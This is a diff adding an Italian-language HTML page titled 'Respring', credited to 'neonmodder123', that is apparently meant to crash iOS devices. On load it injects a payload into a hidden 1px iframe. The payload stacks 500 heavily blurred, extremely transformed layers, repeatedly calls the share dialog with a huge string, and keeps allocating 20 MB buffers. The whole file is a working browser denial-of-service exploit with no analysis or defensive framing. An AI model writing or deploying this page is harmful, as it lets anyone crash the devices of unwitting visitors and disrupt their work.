@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Respring</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      background: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    .status {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 24px;
+      line-height: 1.45;
+    }
+    .status small {
+      display: block;
+      margin-top: 8px;
+      opacity: 0.55;
+      font-size: 12px;
+    }
+    #blast {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 1px;
+      height: 1px;
+      border: 0;
+      opacity: 0.05;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="status">
+    Respring in corso…
+    <small>Metodo di neonmodder123 · MIT</small>
+  </div>
+  <iframe id="blast" sandbox="allow-scripts allow-modals allow-forms allow-same-origin" title="respring"></iframe>
+  <script>
+    window.addEventListener("load", function () {
+      var frame = document.getElementById("blast");
+      var inner = [
+        "<!DOCTYPE html><html><head><meta charset='utf-8'></head>",
+        "<body style='margin:0;overflow:hidden'><script>",
+        "(function(){",
+        "var root=document.createElement('div');",
+        "root.style.cssText='perspective:1px;perspective-origin:9999999% 9999999%;position:fixed;top:0;left:0;width:100vw;height:100vh;';",
+        "document.body.appendChild(root);",
+        "for(var i=0;i<500;i++){",
+        "var layer=document.createElement('div');",
+        "layer.style.cssText='position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);opacity:0.99;';",
+        "root.appendChild(layer);",
+        "}",
+        "var held=[];var n=0;",
+        "var timer=setInterval(function(){",
+        "n++;",
+        "try{navigator.share({title:'R',text:'R'.repeat(100000)});}catch(e){}",
+        "try{var buf=new Uint8Array(1024*1024*20);crypto.getRandomValues(buf);held.push(buf);}catch(e){clearInterval(timer);}",
+        "if(n>=30)clearInterval(timer);",
+        "},0);",
+        "})();",
+        "<" + "/script></body></html>"
+      ].join("");
+      frame.srcdoc = inner;
+    });
+  </script>
+</body>
+</html>
